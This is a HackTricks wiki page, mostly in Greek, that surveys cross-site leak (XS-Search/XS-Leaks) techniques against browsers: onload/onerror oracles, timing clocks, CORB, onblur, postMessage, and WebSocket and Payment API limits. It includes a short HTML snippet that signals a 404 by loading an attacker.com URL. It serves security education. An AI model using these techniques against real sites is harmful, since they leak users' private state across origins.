# XS-Search/XS-Leaks

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε [****](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) για να δημιουργήσετε και να ** αυτοματοποιήσετε ροές εργασίας** με τη βοήθεια των **πιο προηγμένων** εργαλείων της κοινότητας στον κόσμο.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Βασικές Πληροφορίες

Το XS-Search είναι μια μέθοδος που χρησιμοποιείται για **την εξαγωγή πληροφοριών από διαφορετικές προελεύσεις** εκμεταλλευόμενη **ευπάθειες πλευρικών καναλιών**.

Τα κύρια στοιχεία που εμπλέκονται σε αυτήν την επίθεση περιλαμβάνουν:

* **Ευάλωτο Διαδίκτυο**: Ο στόχος ιστότοπος από τον οποίο προορίζεται να εξαχθούν πληροφορίες.
* **Διαδίκτυο Επιτιθέμενου**: Ο κακόβουλος ιστότοπος που δημιουργείται από τον επιτιθέμενο, τον οποίο επισκέπτεται το θύμα, φιλοξενώντας την εκμετάλλευση.
* **Μέθοδος Συμπερίληψης**: Η τεχνική που χρησιμοποιείται για να ενσωματώσει το Ευάλωτο Διαδίκτυο στο Διαδίκτυο του Επιτιθέμενου (π.χ., window.open, iframe, fetch, HTML tag με href, κ.λπ.).
* **Τεχνική Διαρροής**: Τεχνικές που χρησιμοποιούνται για να διακρίνουν διαφορές στην κατάσταση του Ευάλωτου Διαδικτύου με βάση τις πληροφορίες που συλλέγονται μέσω της μεθόδου συμπερίληψης.
* **Καταστάσεις**: Οι δύο πιθανές συνθήκες του Ευάλωτου Διαδικτύου, τις οποίες ο επιτιθέμενος στοχεύει να διακρίνει.
* **Ανιχνεύσιμες Διαφορές**: Παρατηρήσιμες παραλλαγές στις οποίες ο επιτιθέμενος βασίζεται για να συμπεράνει την κατάσταση του Ευάλωτου Διαδικτύου.

### Ανιχνεύσιμες Διαφορές

Διάφορες πτυχές μπορούν να αναλυθούν για να διαφοροποιήσουν τις καταστάσεις του Ευάλωτου Διαδικτύου:

* **Κωδικός Κατάστασης**: Διαχωρισμός μεταξύ **διαφορετικών κωδικών κατάστασης HTTP** από διαφορετικές προελεύσεις, όπως σφάλματα διακομιστή, σφάλματα πελάτη ή σφάλματα αυθεντικοποίησης.
* **Χρήση API**: Αναγνώριση **χρήσης Web APIs** σε σελίδες, αποκαλύπτοντας εάν μια σελίδα από διαφορετική προέλευση χρησιμοποιεί μια συγκεκριμένη JavaScript Web API.
* **Ανακατευθύνσεις**: Ανίχνευση πλοηγήσεων σε διαφορετικές σελίδες, όχι μόνο HTTP ανακατευθύνσεις αλλά και αυτές που ενεργοποιούνται από JavaScript ή HTML.
* **Περιεχόμενο Σελίδας**: Παρατήρηση **παραλλαγών στο σώμα της απόκρισης HTTP** ή σε υπο-πόρους της σελίδας, όπως ο **αριθμός των ενσωματωμένων πλαισίων** ή οι διαφορές μεγέθους στις εικόνες.
* **HTTP Header**: Σημείωση της παρουσίας ή πιθανώς της τιμής ενός **συγκεκριμένου HTTP response header**, συμπεριλαμβανομένων των headers όπως X-Frame-Options, Content-Disposition και Cross-Origin-Resource-Policy.
* **Χρόνος**: Παρατήρηση σταθερών διαφορών χρόνου μεταξύ των δύο καταστάσεων.

### Μέθοδοι Συμπερίληψης

* **HTML Στοιχεία**: Το HTML προσφέρει διάφορα στοιχεία για **συμπερίληψη πόρων από διαφορετικές προελεύσεις**, όπως στυλ, εικόνες ή σενάρια, αναγκάζοντας τον περιηγητή να ζητήσει έναν μη-HTML πόρο. Μια συλλογή πιθανών HTML στοιχείων για αυτόν τον σκοπό μπορεί να βρεθεί στο [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Πλαίσια**: Στοιχεία όπως **iframe**, **object** και **embed** μπορούν να ενσωματώσουν HTML πόρους απευθείας στη σελίδα του επιτιθέμενου. Εάν η σελίδα **λείπει προστασία πλαισίωσης**, η JavaScript μπορεί να έχει πρόσβαση στο αντικείμενο παραθύρου του πλαισιωμένου πόρου μέσω της ιδιότητας contentWindow.
* **Αναδυόμενα Παράθυρα**: Η μέθοδος **`window.open`** ανοίγει έναν πόρο σε μια νέα καρτέλα ή παράθυρο, παρέχοντας μια **χειριστή παραθύρου** για την JavaScript να αλληλεπιδρά με μεθόδους και ιδιότητες σύμφωνα με το SOP. Τα αναδυόμενα παράθυρα, που χρησιμοποιούνται συχνά σε διαδικασίες αυτόματης σύνδεσης, παρακάμπτουν τους περιορισμούς πλαισίωσης και cookie ενός πόρου στόχου. Ωστόσο, οι σύγχρονοι περιηγητές περιορίζουν τη δημιουργία αναδυόμενων παραθύρων σε ορισμένες ενέργειες χρηστών.
* **Αιτήματα JavaScript**: Η JavaScript επιτρέπει άμεσες αιτήσεις σε πόρους στόχου χρησιμοποιώντας **XMLHttpRequests** ή το **Fetch API**. Αυτές οι μέθοδοι προσφέρουν ακριβή έλεγχο πάνω στην αίτηση, όπως η επιλογή να ακολουθήσουν HTTP ανακατευθύνσεις.

### Τεχνικές Διαρροής

* **Διαχειριστής Εκδηλώσεων**: Μια κλασική τεχνική διαρροής στο XS-Leaks, όπου οι διαχειριστές εκδηλώσεων όπως **onload** και **onerror** παρέχουν πληροφορίες σχετικά με την επιτυχία ή αποτυχία φόρτωσης πόρων.
* **Μηνύματα Σφάλματος**: Εξαιρέσεις JavaScript ή ειδικές σελίδες σφαλμάτων μπορούν να παρέχουν πληροφορίες διαρροής είτε άμεσα από το μήνυμα σφάλματος είτε διαχωρίζοντας την παρουσία και την απουσία του.
* **Παγκόσμιοι Περιορισμοί**: Φυσικοί περιορισμοί ενός περιηγητή, όπως η χωρητικότητα μνήμης ή άλλοι επιβεβλημένοι περιορισμοί του περιηγητή, μπορούν να σηματοδοτήσουν πότε έχει επιτευχθεί ένα όριο, λειτουργώντας ως τεχνική διαρροής.
* **Παγκόσμια Κατάσταση**: Ανιχνεύσιμες αλληλεπιδράσεις με τις **παγκόσμιες καταστάσεις** των περιηγητών (π.χ., η διεπαφή Ιστορίας) μπορούν να εκμεταλλευτούν. Για παράδειγμα, ο **αριθμός των καταχωρίσεων** στην ιστορία ενός περιηγητή μπορεί να προσφέρει ενδείξεις σχετικά με σελίδες από διαφορετικές προελεύσεις.
* **Performance API**: Αυτό το API παρέχει **λεπτομέρειες απόδοσης της τρέχουσας σελίδας**, συμπεριλαμβανομένου του χρόνου δικτύου για το έγγραφο και τους φορτωμένους πόρους, επιτρέποντας συμπεράσματα σχετικά με τους ζητούμενους πόρους.
* **Αναγνώσιμες Ιδιότητες**: Ορισμένες HTML ιδιότητες είναι **αναγνώσιμες από διαφορετικές προελεύσεις** και μπορούν να χρησιμοποιηθούν ως τεχνική διαρροής. Για παράδειγμα, η ιδιότητα `window.frame.length` επιτρέπει στην JavaScript να μετρά τα πλαίσια που περιλαμβάνονται σε μια ιστοσελίδα από διαφορετική προέλευση.

## Εργαλείο XSinator & Έγγραφο

Το XSinator είναι ένα αυτόματο εργαλείο για **έλεγχο περιηγητών έναντι αρκετών γνωστών XS-Leaks** που εξηγούνται στο έγγραφό του: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Μπορείτε να **έχετε πρόσβαση στο εργαλείο στο** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**Εξαιρούμενες XS-Leaks**: Αναγκαστήκαμε να εξαιρέσουμε XS-Leaks που βασίζονται σε **εργαζόμενους υπηρεσιών** καθώς θα παρεμβαίνουν σε άλλες διαρροές στο XSinator. Επιπλέον, επιλέξαμε να **εξαιρέσουμε XS-Leaks που βασίζονται σε κακή διαμόρφωση και σφάλματα σε μια συγκεκριμένη εφαρμογή ιστού**. Για παράδειγμα, κακές διαμορφώσεις CrossOrigin Resource Sharing (CORS), διαρροές postMessage ή Cross-Site Scripting. Επιπλέον, εξαιρέσαμε τις XS-Leaks που βασίζονται σε χρόνο, καθώς συχνά υποφέρουν από αργές, θορυβώδεις και ανακριβείς διαδικασίες.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** με τη βοήθεια των **πιο προηγμένων** εργαλείων της κοινότητας στον κόσμο.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## **Τεχνικές Βασισμένες σε Χρόνο**

Ορισμένες από τις παρακάτω τεχνικές θα χρησιμοποιήσουν το χρόνο ως μέρος της διαδικασίας για να ανιχνεύσουν διαφορές στις πιθανές καταστάσεις των ιστοσελίδων. Υπάρχουν διάφοροι τρόποι μέτρησης του χρόνου σε έναν περιηγητή ιστού.

**Ρολόγια**: Το [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) API επιτρέπει στους προγραμματιστές να αποκτούν μετρήσεις χρόνου υψηλής ανάλυσης.\
Υπάρχει ένας σημαντικός αριθμός APIs που μπορούν να καταχραστούν οι επιτιθέμενοι για να δημιουργήσουν έμμεσες ρολόγια: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast\_Channel\_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS animations, και άλλα.\
Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Τεχνικές Διαχειριστή Εκδηλώσεων

### Onload/Onerror

* **Μέθοδοι Συμπερίληψης**: Πλαίσια, HTML Στοιχεία
* **Ανιχνεύσιμη Διαφορά**: Κωδικός Κατάστασης
* **Περισσότερες πληροφορίες**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Περίληψη**: αν προσπαθείτε να φορτώσετε έναν πόρο, οι εκδηλώσεις onerror/onload ενεργοποιούνται όταν ο πόρος φορτώνεται επιτυχώς/αποτυχημένα, είναι δυνατόν να καταλάβετε τον κωδικό κατάστασης.
* **Παράδειγμα κώδικα**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Το παράδειγμα κώδικα προσπαθεί να **φορτώσει σενάρια αντικειμένων από JS**, αλλά **άλλες ετικέτες** όπως αντικείμενα, στυλ, εικόνες, ήχοι θα μπορούσαν επίσης να χρησιμοποιηθούν. Επιπλέον, είναι επίσης δυνατό να εισαχθεί η **ετικέτα απευθείας** και να δηλωθούν τα γεγονότα `onload` και `onerror` μέσα στην ετικέτα (αντί να την εισάγουμε από JS).

Υπάρχει επίσης μια έκδοση χωρίς σενάριο αυτής της επίθεσης:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In this case if `example.com/404` is not found `attacker.com/?error` will be loaded.

### Onload Timing

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Summary:** The [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο χρειάζεται για να εκτελέσει ένα αίτημα. Ωστόσο, άλλες ρολόγια θα μπορούσαν να χρησιμοποιηθούν, όπως το [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) που μπορεί να εντοπίσει εργασίες που εκτελούνται για περισσότερα από 50ms.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) another example in:

{% content-ref url="performance.now-example.md" %}
[performance.now-example.md](performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Forced Heavy Task

This technique is just like the previous one, but the **attacker** will also **force** some action to take a **relevant amount time** when the **answer is positive or negative** and measure that time.

{% content-ref url="performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Summary:** The [SharedArrayBuffer clock](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο χρειάζεται για να εκτελέσει ένα αίτημα. Άλλα ρολόγια θα μπορούσαν να χρησιμοποιηθούν.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

The time taken to fetch a resource can be measured by utilizing the [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) and [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) events. The **`beforeunload`** event is fired when the browser is about to navigate to a new page, while the **`unload`** event occurs when the navigation is actually taking place. The time difference between these two events can be calculated to determine the **duration the browser spent fetching the resource**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inclusion Methods**: Frames
* **Detectable Difference**: Timing (generally due to Page Content, Status Code)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Summary:** The [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API μπορεί να χρησιμοποιηθεί για να μετρήσει πόσο χρόνο χρειάζεται για να εκτελέσει ένα αίτημα. Άλλα ρολόγια θα μπορούσαν να χρησιμοποιηθούν.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

It has been observed that in the absence of [Framing Protections](https://xsleaks.dev/docs/defenses/opt-in/xfo/), the time required for a page and its subresources to load over the network can be measured by an attacker. This measurement is typically possible because the `onload` handler of an iframe is triggered only after the completion of resource loading and JavaScript execution. To bypass the variability introduced by script execution, an attacker might employ the [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) attribute within the `<iframe>`. The inclusion of this attribute restricts numerous functionalities, notably the execution of JavaScript, thereby facilitating a measurement that is predominantly influenced by network performance.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **Inclusion Methods**: Frames
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**:
* **Summary**: Αν μπορείτε να κάνετε τη σελίδα να εμφανίζει σφάλμα όταν προσπελάζεται το σωστό περιεχόμενο και να φορτώνει σωστά όταν προσπελάζεται οποιοδήποτε περιεχόμενο, τότε μπορείτε να δημιουργήσετε έναν βρόχο για να εξάγετε όλες τις πληροφορίες χωρίς να μετράτε τον χρόνο.
* **Code Example**:

Υποθέστε ότι μπορείτε να **εισάγετε** τη **σελίδα** που έχει το **μυστικό** περιεχόμενο **μέσα σε ένα Iframe**.

Μπορείτε να **κάνετε το θύμα να αναζητήσει** το αρχείο που περιέχει "_**flag**_" χρησιμοποιώντας ένα **Iframe** (εκμεταλλευόμενοι ένα CSRF για παράδειγμα). Μέσα στο Iframe γνωρίζετε ότι το _**onload event**_ θα εκτελείται **πάντα τουλάχιστον μία φορά**. Στη συνέχεια, μπορείτε να **αλλάξετε** τη **διεύθυνση URL** του **iframe** αλλάζοντας μόνο το **περιεχόμενο** του **hash** μέσα στη διεύθυνση URL.

Για παράδειγμα:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Αν η πρώτη διεύθυνση URL **φορτώθηκε επιτυχώς**, τότε, όταν **αλλάξετε** το **hash** μέρος της διεύθυνσης URL, το **onload** event **δεν θα ενεργοποιηθεί** ξανά. Αλλά **αν** η σελίδα είχε κάποιο είδος **σφάλματος** κατά τη **φόρτωση**, τότε, το **onload** event θα **ενεργοποιηθεί ξανά**.

Στη συνέχεια, μπορείτε να **διακρίνετε μεταξύ** μιας **σωστά** φορτωμένης σελίδας ή μιας σελίδας που έχει ένα **σφάλμα** όταν προσπελάζεται.

### Javascript Execution

* **Inclusion Methods**: Frames
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**:
* **Summary:** Αν η **σελίδα** **επιστρέφει** το **ευαίσθητο** περιεχόμενο, **ή** ένα **περιεχόμενο** που μπορεί να **ελεγχθεί** από τον χρήστη. Ο χρήστης θα μπορούσε να ορίσει **έγκυρο JS κώδικα στην αρνητική περίπτωση**, και να **φορτώνει** κάθε προσπάθεια μέσα σε **`<script>`** ετικέτες, έτσι σε **αρνητικές** περιπτώσεις ο **κώδικας** των επιτιθεμένων **εκτελείται**, και σε **θετικές** περιπτώσεις **τίποτα** δεν θα εκτελείται.
* **Code Example:**

{% content-ref url="javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Κωδικός Κατάστασης & Επικεφαλίδες
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Summary**: **Cross-Origin Read Blocking (CORB)** είναι ένα μέτρο ασφαλείας που αποτρέπει τις ιστοσελίδες από το να φορτώνουν ορισμένους ευαίσθητους πόρους από άλλες προελεύσεις για να προστατεύσουν από επιθέσεις όπως το **Spectre**. Ωστόσο, οι επιτιθέμενοι μπορούν να εκμεταλλευτούν τη συμπεριφορά προστασίας του. Όταν μια απάντηση που υπόκειται σε **CORB** επιστρέφει έναν _**CORB protected**_ `Content-Type` με `nosniff` και έναν κωδικό κατάστασης `2xx`, το **CORB** αφαιρεί το σώμα και τις επικεφαλίδες της απάντησης. Οι επιτιθέμενοι που παρατηρούν αυτό μπορούν να συμπεράνουν τη συνδυασμένη **κατάσταση κωδικού** (που υποδηλώνει επιτυχία ή σφάλμα) και το `Content-Type` (που δηλώνει αν είναι προστατευμένο από **CORB**), οδηγώντας σε πιθανή διαρροή πληροφοριών.
* **Code Example**:

Ελέγξτε τον σύνδεσμο περισσότερων πληροφοριών για περισσότερες πληροφορίες σχετικά με την επίθεση.

### onblur

* **Inclusion Methods**: Frames
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Summary**: Διαρροή ευαίσθητων δεδομένων από το id ή το όνομα χαρακτηριστικό.
* **Code Example**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Είναι δυνατόν να **φορτώσετε μια σελίδα** μέσα σε ένα **iframe** και να χρησιμοποιήσετε το **`#id_value`** για να κάνετε τη σελίδα να **εστιάσει στο στοιχείο** του iframe με το υποδεικνυόμενο id, στη συνέχεια αν ενεργοποιηθεί ένα σήμα **`onblur`**, το στοιχείο ID υπάρχει.\
Μπορείτε να εκτελέσετε την ίδια επίθεση με **`portal`** ετικέτες.

### postMessage Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Χρήση API
* **More info**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Summary**: Συγκέντρωση ευαίσθητων πληροφοριών από ένα postMessage ή χρήση της παρουσίας των postMessages ως οράκλας για να γνωρίζετε την κατάσταση του χρήστη στη σελίδα
* **Code Example**: `Οποιοσδήποτε κώδικας ακούει για όλα τα postMessages.`

Οι εφαρμογές χρησιμοποιούν συχνά [`postMessage` broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) για να επικοινωνούν μεταξύ διαφορετικών προελεύσεων. Ωστόσο, αυτή η μέθοδος μπορεί ακούσια να εκθέσει **ευαίσθητες πληροφορίες** αν η παράμετρος `targetOrigin` δεν καθοριστεί σωστά, επιτρέποντας σε οποιοδήποτε παράθυρο να λάβει τα μηνύματα. Επιπλέον, η απλή πράξη λήψης ενός μηνύματος μπορεί να λειτουργήσει ως **οράκλας**; για παράδειγμα, ορισμένα μηνύματα μπορεί να αποστέλλονται μόνο σε χρήστες που είναι συνδεδεμένοι. Επομένως, η παρουσία ή η απουσία αυτών των μηνυμάτων μπορεί να αποκαλύψει πληροφορίες σχετικά με την κατάσταση ή την ταυτότητα του χρήστη, όπως αν είναι αυθεντικοποιημένος ή όχι.

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Χρησιμοποιήστε [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) για να δημιουργήσετε και να **αυτοματοποιήσετε ροές εργασίας** που υποστηρίζονται από τα **πιο προηγμένα** εργαλεία της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Global Limits Techniques

### WebSocket API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Χρήση API
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Η εξάντληση του ορίου σύνδεσης WebSocket διαρρέει τον αριθμό των συνδέσεων WebSocket μιας σελίδας από άλλη προέλευση.
* **Code Example**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Είναι δυνατόν να προσδιορίσετε αν, και πόσες, **συνδέσεις WebSocket χρησιμοποιεί μια στοχευμένη σελίδα**. Αυτό επιτρέπει σε έναν επιτιθέμενο να ανιχνεύσει τις καταστάσεις της εφαρμογής και να διαρρεύσει πληροφορίες που σχετίζονται με τον αριθμό των συνδέσεων WebSocket.

Αν μια **προέλευση** χρησιμοποιεί το **μέγιστο ποσό αντικειμένων σύνδεσης WebSocket**, ανεξάρτητα από την κατάσταση των συνδέσεών τους, η δημιουργία **νέων αντικειμένων θα έχει ως αποτέλεσμα εξαιρέσεις JavaScript**. Για να εκτελέσετε αυτήν την επίθεση, η ιστοσελίδα του επιτιθέμενου ανοίγει την στοχευμένη ιστοσελίδα σε ένα αναδυόμενο παράθυρο ή iframe και στη συνέχεια, αφού έχει φορτωθεί η στοχευμένη ιστοσελίδα, προσπαθεί να δημιουργήσει τον μέγιστο αριθμό δυνατών συνδέσεων WebSocket. Ο **αριθμός των εκτιναγμένων εξαιρέσεων** είναι ο **αριθμός των συνδέσεων WebSocket που χρησιμοποιούνται από την στοχευμένη ιστοσελίδα**.

### Payment API

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Χρήση API
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Summary**: Ανίχνευση αιτήματος πληρωμής επειδή μόνο ένα μπορεί να είναι ενεργό τη φορά.
* **Code Example**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Αυτή η XS-Leak επιτρέπει σε έναν επιτιθέμενο να **ανιχνεύσει πότε μια σελίδα από άλλη προέλευση ξεκινά ένα αίτημα πληρωμής**.

Επειδή **μόνο ένα αίτημα πληρωμής μπορεί να είναι ενεργό** τη φορά, αν η στοχευμένη ιστοσελίδα χρησιμοποιεί το Payment Request API, οποιαδήποτε περαιτέρω προσπάθεια να χρησιμοποιήσει αυτό το API θα αποτύχει** και θα προκαλέσει μια **εξαίρεση JavaScript**. Ο επιτιθέμενος μπορεί να εκμεταλλευτεί αυτό προσπαθώντας **περιοδικά να εμφανίσει το UI του Payment API**. Αν μια προσπάθεια προκαλέσει μια εξαίρεση, η στοχευμένη ιστοσελίδα το χρησιμοποιεί αυτή τη στιγμή. Ο επιτιθέμενος μπορεί να κρύψει αυτές τις περιοδικές προσπάθειες κλείνοντας αμέσως το UI μετά τη δημιουργία του.

### Timing the Event Loop <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Summary:** Μετρήστε τον χρόνο εκτέλεσης ενός ιστού εκμεταλλευόμενοι τον μονόνημα JS event loop.
* **Code Example**:

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

Η JavaScript λειτουργεί σε ένα [μονόνημα event loop](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop) μοντέλο ταυτόχρονης εκτέλεσης, υποδηλώνοντας ότι **μπορεί να εκτελεί μόνο μία εργασία τη φορά**. Αυτή η χαρακτηριστική μπορεί να εκμεταλλευτεί για να μετρήσει **πόσο χρόνο χρειάζεται ο κώδικας από μια διαφορετική προέλευση για να εκτελεστεί**. Ένας επιτιθέμενος μπορεί να μετρήσει τον χρόνο εκτέλεσης του δικού του κώδικα στο event loop αποστέλλοντας συνεχώς γεγονότα με σταθερές ιδιότητες. Αυτά τα γεγονότα θα επεξεργαστούν όταν η δεξαμενή γεγονότων είναι άδεια. Αν και άλλες προελεύσεις αποστέλλουν επίσης γεγονότα στην ίδια δεξαμενή, ένας **επιτιθέμενος μπορεί να συμπεράνει τον χρόνο που χρειάζεται για να εκτελούνται αυτά τα εξωτερικά γεγονότα παρατηρώντας καθυστερήσεις στην εκτέλεση των δικών του εργασιών**. Αυτή η μέθοδος παρακολούθησης του event loop για καθυστερήσεις μπορεί να αποκαλύψει τον χρόνο εκτέλεσης του κώδικα από διαφορετικές προελεύσεις, ενδεχομένως εκθέτοντας ευαίσθητες πληροφορίες.

{% hint style="warning" %}
Σε έναν χρονισμό εκτέλεσης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν τη φορτώσετε.
{% endhint %}

### Busy Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Inclusion Methods**:
* **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
